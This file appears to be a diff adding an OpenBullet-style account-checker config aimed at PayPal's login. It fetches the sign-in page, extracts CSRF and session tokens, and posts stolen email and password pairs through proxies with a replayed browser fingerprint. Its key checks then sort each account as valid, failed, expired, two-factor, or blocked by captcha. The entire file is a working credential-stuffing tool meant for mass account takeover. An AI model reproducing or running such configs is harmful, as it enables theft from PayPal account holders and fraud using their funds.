@@ -1,0 +1,93 @@
+[SETTINGS]
+{
+  "Name": "PayPal",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-01-23T17:03:41.2699335+03:30",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.2.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.paypal.com/signin?intent=checkout&ctxId=xo_ctx_EC-3MY45231L9318650P&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26token%3DBA-9F1474921A1843643%26useraction%3Dcommit%26rm%3D1%26mfid%3D1598035664509_9b7e1d8c44c7f&flowId=BA-9F14749%3Fflow%3D1-P%26ulReturn%3Dtrue%26token%3DBA-9F1474921A1843643%26useraction%3Dcommit%26rm%3D1%26mfid%3D1598035664509_9b7e1d8c44c7f&flowId=BA-9F1474921A1843643&country.x=US&locale.x=en_US&26standaloneFundingSource%3Dpaypal%26clientID%3DAQbghYd-7mRPyimEriYScIgTnYUsLnr5wVnPnmfPaSzwKrUe3qNzfEc5hXr9Ucf_JG_HFAZpJMJYXMuk%26env%3Dproduction%26sdkMeta%3DeyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVFiZ2hZZC03bVJQeWltRXJpWVNjSWdUbllVc0xucjV3Vm5Qbm1mUGFTendLclVlM3FOemZFYzVoWHI5VWNmX0pHX0hGQVpwSk1KWVhNdWsmbWVyY2hhbnQtaWQ9M1lWUDRUM1RYV1pRUyZpbnRlbnQ9Y2FwdHVyZSZsb2NhbGU9ZW5fVVMmY29tcG9uZW50cz1idXR0b25zLGZ1bmRpbmctZWxpZ2liaWxpdHksbWVzc2FnZXMmY29tbWl0PWZhbHNlJmN1cnJlbmN5PVVTRCIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb1RoZW1lc19FQyIsImRhdGEtdWlkIjoiODgzZTg5ZTUwZl9tdHU2bWphNm5keSJ9fQ%26xcomponent%3D1%26version%3D5.0.178%26token%3DEC-3MY45231L9318650P&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVFiZ2hZZC03bVJQeWltRXJpWVNjSWdUbllVc0xucjV3Vm5Qbm1mUGFTendLclVlM3FOemZFYzVoWHI5VWNmX0pHX0hGQVpwSk1KWVhNdWsmbWVyY2hhbnQtaWQ9M1lWUDRUM1RYV1pRUyZpbnRlbnQ9Y2FwdHVyZSZsb2NhbGU9ZW5fVVMmY29tcG9uZW50cz1idXR0b25zLGZ1bmRpbmctZWxpZ2liaWxpdHksbWVzc2FnZXMmY29tbWl0PWZhbHNlJmN1cnJlbmN5PVVTRCIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb1RoZW1lc19FQyIsImRhdGEtdWlkIjoiODgzZTg5ZTUwZl9tdHU2bWphNm5keSJ9fQ&locale.x=en_US&country.x=US&flowId=EC-3MY45231L9318650P" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#_csrf PARSE "<SOURCE>" LR "\"_csrf\" value=\"" "\"" -> VAR "_csrf" 
+
+#_sessionID PARSE "<SOURCE>" LR "name=\"_sessionID\" value=\"" "\"" -> VAR "_sessionID" 
+
+REQUEST POST "https://www.paypal.com/signin?intent=checkout&ctxId=xo_ctx_EC-3MY45231L9318650P&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26token%3DBA-9F1474921A1843643%26useraction%3Dcommit%26rm%3D1%26mfid%3D1598035664509_9b7e1d8c44c7f&flowId=BA-9F14749%3Fflow%3D1-P%26ulReturn%3Dtrue%26token%3DBA-9F1474921A1843643%26useraction%3Dcommit%26rm%3D1%26mfid%3D1598035664509_9b7e1d8c44c7f&flowId=BA-9F1474921A1843643&flowId=EC-3MY45231L9318650P&country.x=US&country.x=US&locale.x=en_US&locale.x=en_US&26standaloneFundingSource%3Dpaypal%26clientID%3DAQbghYd-7mRPyimEriYScIgTnYUsLnr5wVnPnmfPaSzwKrUe3qNzfEc5hXr9Ucf_JG_HFAZpJMJYXMuk%26env%3Dproduction%26sdkMeta%3DeyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVFiZ2hZZC03bVJQeWltRXJpWVNjSWdUbllVc0xucjV3Vm5Qbm1mUGFTendLclVlM3FOemZFYzVoWHI5VWNmX0pHX0hGQVpwSk1KWVhNdWsmbWVyY2hhbnQtaWQ9M1lWUDRUM1RYV1pRUyZpbnRlbnQ9Y2FwdHVyZSZsb2NhbGU9ZW5fVVMmY29tcG9uZW50cz1idXR0b25zLGZ1bmRpbmctZWxpZ2liaWxpdHksbWVzc2FnZXMmY29tbWl0PWZhbHNlJmN1cnJlbmN5PVVTRCIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb1RoZW1lc19FQyIsImRhdGEtdWlkIjoiODgzZTg5ZTUwZl9tdHU2bWphNm5keSJ9fQ%26xcomponent%3D1%26version%3D5.0.178%26token%3DEC-3MY45231L9318650P=&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVFiZ2hZZC03bVJQeWltRXJpWVNjSWdUbllVc0xucjV3Vm5Qbm1mUGFTendLclVlM3FOemZFYzVoWHI5VWNmX0pHX0hGQVpwSk1KWVhNdWsmbWVyY2hhbnQtaWQ9M1lWUDRUM1RYV1pRUyZpbnRlbnQ9Y2FwdHVyZSZsb2NhbGU9ZW5fVVMmY29tcG9uZW50cz1idXR0b25zLGZ1bmRpbmctZWxpZ2liaWxpdHksbWVzc2FnZXMmY29tbWl0PWZhbHNlJmN1cnJlbmN5PVVTRCIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb1RoZW1lc19FQyIsImRhdGEtdWlkIjoiODgzZTg5ZTUwZl9tdHU2bWphNm5keSJ9fQ" 
+  CONTENT "_csrf=<_csrf>&_sessionID=<_sessionID>&locale.x=en_US&processSignin=main&fn_sync_data=%257B%2522SC_VERSION%2522%253A%25222.0.1%2522%252C%2522syncStatus%2522%253A%2522data%2522%252C%2522f%2522%253A%2522BA-9F14749%253Fflow%253D1-P%2526amp%253BulReturn%253Dtrue%2526amp%253Btoken%253DBA-9F1474921A1843643%2526amp%253Buseraction%253Dcommit%2526amp%253Brm%253D1%2526amp%253Bmfid%253D1598035664509_9b7e1d8c44c7f%252CBA-9F1474921A1843643%252CEC-3MY45231L9318650P%2522%252C%2522s%2522%253A%2522UL_CHECKOUT_INPUT_PASSWORD%2522%252C%2522chk%2522%253A%257B%2522ts%2522%253A1610482409963%252C%2522eteid%2522%253A%255B-1610036376%252C-6987174589%252C-1208130778%252C-1752541873%252C2666420305%252C365504218%252C-820121624%252C6422027096%252C3054703113%252C-20600016019%252C3909783292%252C4800741469%252C-1610036376%252C-6987174589%252C7945053462%252C-5574128236%252C1735265012%252C3238175068%252C2185962673%252C11224209522%252C-1095353156%252C-5938188747%252C8661048533%252C8476875349%252C-666846098%252C-6182960519%252C18009622890%252C1814541496%252C-1655388246%252C5376525763%252C-4880701770%252C7005692099%252C10382258904%252C-5331248005%252C-3902736967%252C4887859747%252C-6493054076%252C4311143048%252C-1553063888%252C-543761358%252C3515400237%252C877933210%252C-13415205549%252C-743092523%252C1921535596%252C9544728216%255D%252C%2522tts%2522%253A1148%257D%252C%2522dc%2522%253A%2522%257B%255C%2522screen%255C%2522%253A%257B%255C%2522colorDepth%255C%2522%253A24%252C%255C%2522pixelDepth%255C%2522%253A24%252C%255C%2522height%255C%2522%253A768%252C%255C%2522width%255C%2522%253A1366%252C%255C%2522availHeight%255C%2522%253A738%252C%255C%2522availWidth%255C%2522%253A1366%257D%252C%255C%2522ua%255C%2522%253A%255C%2522Mozilla%252F5.0%2520%28Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%29%2520AppleWebKit%252F537.36%2520%28KHTML%252C%2520like%2520Gecko%29%2520Chrome%252F87.0.48YiBcrbfYr4sk4gCM2qES6hb6gveaEeBRr8Yy5eGavZ2K268i2MU4xJu5aZ38Q4xNUhMMX5YnPW6DAhQ9bu7BRAQDuiggZ2522Di0%253A12164Di1%253A38Di2%253A60Ui1%253A32Ui0%253A40Di3%253A20Ui2%253A42Di4%253A19Di5%253A60Uh%253A3652%2522%252C%2522rDT%2522%253A%252236238%252C35902%252C38146%253A15803%252C15451%252C15378%253A41467%252C41117%252C40994%253A21035%252C20716%252C20501%253A26205%252C25893%252C25626%253A5743%252C5443%252C5133%253A46751%252C46459%252C46116%253A26274%252C25986%252C25625%253A21156%252C20872%252C20503%253A10916%252C10634%252C10255%253A5794%252C5514%252C5132%253A21163%252C20887%252C20503%253A10917%252C10645%252C10255%253A46776%252C46508%252C46117%253A41647%252C41388%252C40994%253A21150%252C20901%252C20502%253A5776%252C5535%252C5132%253A21139%252C20904%252C20502%253A26259%252C26027%252C25625%253A16009%252C15781%252C15379%253A17981%252C22%2522%257D%257D&otpMayflyKey=d47d841ba9b94bf1bd26dd705285eb3dotpChlg&intent=checkout&ads-client-context=checkout&flowId=BA-9F14749%3Fflow%3D1-P%26ulReturn%3Dtrue%26token%3DBA-9F1474921A1843643%26useraction%3Dcommit%26rm%3D1%26mfid%3D1598035664509_9b7e1d8c44c7f%2CBA-9F1474921A1843643%2CEC-3MY45231L9318650P&ads-client-context-data=%7B%22context_id%22%3A%7B%22context_id%22%3A%22BA-9F14749%3Fflow%3D1-P%26ulReturn%3Dtrue%26token%3DBA-9F1474921A1843643%26useraction%3Dcommit%26rm%3D1%26mfid%3D1598035664509_9b7e1d8c44c7f%2CBA-9F1474921A1843643%2CEC-3MY45231L9318650P%22%2C%22channel%22%3A0%2C%22flow_type%22%3A%22checkout%22%7D%7D&ctxId=xo_ctx_EC-3MY45231L9318650P&hideOtpLoginCredentials=true&requestUrl=%2Fsignin%3Fintent%3Dcheckout%26ctxId%3Dxo_ctx_EC-3MY45231L9318650P%26returnUri%3D%252Fwebapps%252Fhermes%26state%3D%253Fflow%253D1-P%2526ulReturn%253Dtrue%2526token%253DBA-9F1474921A1843643%2526useraction%253Dcommit%2526rm%253D1%2526mfid%253D1598035664509_9b7e1d8c44c7f%26flowId%3DBA-9F14749%253Fflow%253D1-P%2526ulReturn%253Dtrue%2526token%253DBA-9F1474921A1843643%2526useraction%253Dcommit%2526rm%253D1%2526mfid%253D1598035664509_9b7e1d8c44c7f%26flowId%3DBA-9F1474921A1843643%26flowId%3DEC-3MY45231L9318650P%26country.x%3DUS%26country.x%3DUS%26locale.x%3Den_US%26locale.x%3Den_US%2626standaloneFundingSource%253Dpaypal%2526clientID%253DAQbghYd-7mRPyimEriYScIgTnYUsLnr5wVnPnmfPaSzwKrUe3qNzfEc5hXr9Ucf_JG_HFAZpJMJYXMuk%2526env%253Dproduction%2526sdkMeta%253DeyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVFiZ2hZZC03bVJQeWltRXJpWVNjSWdUbllVc0xucjV3Vm5Qbm1mUGFTendLclVlM3FOemZFYzVoWHI5VWNmX0pHX0hGQVpwSk1KWVhNdWsmbWVyY2hhbnQtaWQ9M1lWUDRUM1RYV1pRUyZpbnRlbnQ9Y2FwdHVyZSZsb2NhbGU9ZW5fVVMmY29tcG9uZW50cz1idXR0b25zLGZ1bmRpbmctZWxpZ2liaWxpdHksbWVzc2FnZXMmY29tbWl0PWZhbHNlJmN1cnJlbmN5PVVTRCIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb1RoZW1lc19FQyIsImRhdGEtdWlkIjoiODgzZTg5ZTUwZl9tdHU2bWphNm5keSJ9fQ%2526xcomponent%253D1%2526version%253D5.0.178%2526token%253DEC-3MY45231L9318650P%3D%26sdkMeta%3DeyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVFiZ2hZZC03bVJQeWltRXJpWVNjSWdUbllVc0xucjV3Vm5Qbm1mUGFTendLclVlM3FOemZFYzVoWHI5VWNmX0pHX0hGQVpwSk1KWVhNdWsmbWVyY2hhbnQtaWQ9M1lWUDRUM1RYV1pRUyZpbnRlbnQ9Y2FwdHVyZSZsb2NhbGU9ZW5fVVMmY29tcG9uZW50cz1idXR0b25zLGZ1bmRpbmctZWxpZ2liaWxpdHksbWVzc2FnZXMmY29tbWl0PWZhbHNlJmN1cnJlbmN5PVVTRCIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb1RoZW1lc19FQyIsImRhdGEtdWlkIjoiODgzZTg5ZTUwZl9tdHU2bWphNm5keSJ9fQ&forcePhonePasswordOptIn=&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26token%3DBA-9F1474921A1843643%26useraction%3Dcommit%26rm%3D1%26mfid%3D1598035664509_9b7e1d8c44c7f&phoneCode=US+%2B1&login_email=<USER>&login_password=<PASS>&splitLoginContext=inputPassword&isCookiedHybridEmail=true&partyIdHash=3442a823885d043b1393eb29ec5293b4b1b99b1a9a278ee0e9057fb20e190623" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 4794" 
+  HEADER "origin: https://www.paypal.com" 
+  HEADER "referer: <ADDRESS>" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "sec-gpc: 1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "LoginFailed" 
+    KEY "Some of your info isn't" 
+    KEY "Please check your entries" 
+    KEY "We're sorry, we can't log you in" 
+    KEY "Something went" 
+    KEY "Some of your information didn't match" 
+    KEY "Please try again." 
+    KEY "The login details you entered are incorrect" 
+  KEYCHAIN Success OR 
+    KEY "<ADDRESS>" Contains "https://www.paypal.com/webapps" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "For security reasons, you’ll need to" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "Quick security" 
+    KEY "<ADDRESS>" Contains "https://www.paypal.com/authflow/" 
+    KEY "<ADDRESS>" Contains "https://www.paypal.com/twofactor/" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "PayPal is looking" 
+    KEY "We noticed some unusual" 
+  KEYCHAIN Retry OR 
+    KEY "adsRecaptchaSiteKey" 
+    KEY "captcha code" 
+    KEY "CSRF token mismatch" 
+    KEY "Security Prompt" 
+    KEY "Security Challenge" 
+    KEY "اختبار الحماية" 
+
+
